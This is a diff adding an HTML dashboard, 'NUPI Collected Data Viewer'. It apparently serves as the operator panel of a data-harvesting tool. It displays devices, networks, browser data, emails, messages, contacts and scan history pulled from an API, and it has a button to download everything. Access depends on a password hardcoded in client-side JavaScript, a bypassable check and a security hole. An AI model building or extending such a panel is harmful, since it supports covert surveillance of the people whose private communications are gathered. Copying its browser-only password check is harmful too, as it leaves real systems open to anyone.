@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NUPI - View All Collected Data</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Courier New', monospace;
+            background: #000;
+            color: #0f0;
+            padding: 20px;
+        }
+        .container { max-width: 1400px; margin: 0 auto; }
+        h1 { color: #0f0; text-align: center; margin-bottom: 20px; }
+        .login-box {
+            background: #111;
+            padding: 40px;
+            border: 2px solid #0f0;
+            border-radius: 10px;
+            max-width: 400px;
+            margin: 100px auto;
+            text-align: center;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 15px;
+            background: #000;
+            border: 1px solid #0f0;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            margin-bottom: 20px;
+        }
+        .login-box button {
+            width: 100%;
+            padding: 15px;
+            background: #0f0;
+            color: #000;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .data-section {
+            background: #111;
+            border: 2px solid #0f0;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+        }
+        .data-section h2 { color: #0f0; margin-bottom: 15px; }
+        pre { color: #0f0; overflow-x: auto; white-space: pre-wrap; }
+        #dashboard { display: none; }
+        .stat { display: inline-block; padding: 10px 20px; background: #0f0; color: #000; margin: 5px; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div id="loginScreen">
+        <div class="login-box">
+            <h2>NUPI DATA ACCESS</h2>
+            <input type="password" id="password" placeholder="Password" onkeypress="if(event.key==='Enter') login()">
+            <button onclick="login()">ACCESS</button>
+            <p id="error" style="color: red; margin-top: 10px; display: none;">Access Denied</p>
+        </div>
+    </div>
+    
+    <div id="dashboard">
+        <div class="container">
+            <h1>[ NUPI COLLECTED DATA VIEWER ]</h1>
+            
+            <div style="text-align: center; margin-bottom: 30px;">
+                <span class="stat" id="totalPoints">0 Data Points</span>
+                <span class="stat" id="totalDevices">0 Devices</span>
+                <span class="stat" id="totalEmails">0 Emails</span>
+                <span class="stat" id="totalMessages">0 Messages</span>
+                <button class="stat" onclick="refresh()" style="cursor: pointer;">REFRESH</button>
+                <button class="stat" onclick="downloadAll()" style="cursor: pointer;">DOWNLOAD ALL</button>
+            </div>
+            
+            <div class="data-section">
+                <h2>[ SUMMARY ]</h2>
+                <pre id="summary"></pre>
+            </div>
+            
+            <div class="data-section">
+                <h2>[ DEVICES ]</h2>
+                <pre id="devices"></pre>
+            </div>
+            
+            <div class="data-section">
+                <h2>[ NETWORKS ]</h2>
+                <pre id="networks"></pre>
+            </div>
+            
+            <div class="data-section">
+                <h2>[ SYSTEM STATS ]</h2>
+                <pre id="systemStats"></pre>
+            </div>
+            
+            <div class="data-section">
+                <h2>[ BROWSER DATA ]</h2>
+                <pre id="browserData"></pre>
+            </div>
+            
+            <div class="data-section">
+                <h2>[ EMAILS ]</h2>
+                <pre id="emails"></pre>
+            </div>
+            
+            <div class="data-section">
+                <h2>[ MESSAGES ]</h2>
+                <pre id="messages"></pre>
+            </div>
+            
+            <div class="data-section">
+                <h2>[ CONTACTS ]</h2>
+                <pre id="contacts"></pre>
+            </div>
+            
+            <div class="data-section">
+                <h2>[ SCAN HISTORY ]</h2>
+                <pre id="scanHistory"></pre>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        const PASSWORD = 'Jedariusm';
+        
+        function login() {
+            const input = document.getElementById('password').value;
+            if (input === PASSWORD) {
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'block';
+                loadData();
+                setInterval(loadData, 10000);
+            } else {
+                document.getElementById('error').style.display = 'block';
+            }
+        }
+        
+        async function loadData() {
+            try {
+                const response = await fetch('/api/collected-data/full');
+                const result = await response.json();
+                const data = result.data;
+                
+                // Update stats
+                document.getElementById('totalPoints').textContent = data.total_data_points + ' Data Points';
+                document.getElementById('totalDevices').textContent = Object.keys(data.devices).length + ' Devices';
+                document.getElementById('totalEmails').textContent = data.emails.length + ' Emails';
+                document.getElementById('totalMessages').textContent = data.messages.length + ' Messages';
+                
+                // Display summary
+                const summary = await fetch('/api/collected-data/summary');
+                const summaryData = await summary.json();
+                document.getElementById('summary').textContent = JSON.stringify(summaryData.summary, null, 2);
+                
+                // Display devices
+                document.getElementById('devices').textContent = JSON.stringify(data.devices, null, 2);
+                
+                // Display networks
+                document.getElementById('networks').textContent = JSON.stringify(data.networks, null, 2);
+                
+                // Display system stats
+                document.getElementById('systemStats').textContent = JSON.stringify(data.system_stats.slice(-10), null, 2);
+                
+                // Display browser data
+                document.getElementById('browserData').textContent = JSON.stringify(data.browser_data, null, 2);
+                
+                // Display emails
+                document.getElementById('emails').textContent = data.emails.length > 0 ? JSON.stringify(data.emails, null, 2) : 'No emails collected yet';
+                
+                // Display messages
+                document.getElementById('messages').textContent = data.messages.length > 0 ? JSON.stringify(data.messages, null, 2) : 'No messages collected yet';
+                
+                // Display contacts
+                document.getElementById('contacts').textContent = data.contacts.length > 0 ? JSON.stringify(data.contacts, null, 2) : 'No contacts collected yet';
+                
+                // Display scan history
+                document.getElementById('scanHistory').textContent = JSON.stringify(data.scan_history.slice(-20), null, 2);
+                
+            } catch (error) {
+                console.error('Error loading data:', error);
+            }
+        }
+        
+        function refresh() {
+            loadData();
+        }
+        
+        async function downloadAll() {
+            const response = await fetch('/api/collected-data/full');
+            const data = await response.json();
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `nupi-all-data-${Date.now()}.json`;
+            a.click();
+        }
+    </script>
+</body>
+</html>
